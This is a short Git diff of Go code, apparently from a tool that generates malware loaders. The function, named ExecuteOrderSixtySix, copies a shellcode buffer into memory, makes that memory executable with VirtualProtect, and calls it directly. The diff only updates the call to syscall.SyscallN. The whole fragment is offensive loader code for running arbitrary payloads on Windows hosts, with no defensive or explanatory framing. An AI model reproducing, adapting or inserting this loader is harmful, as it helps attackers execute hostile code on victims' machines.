@@ -35,7 +35,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	oldProtect := PAGE_READWRITE
 	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
+	_, _, _ = syscall.SyscallN(addr)
 }
     `)
 }
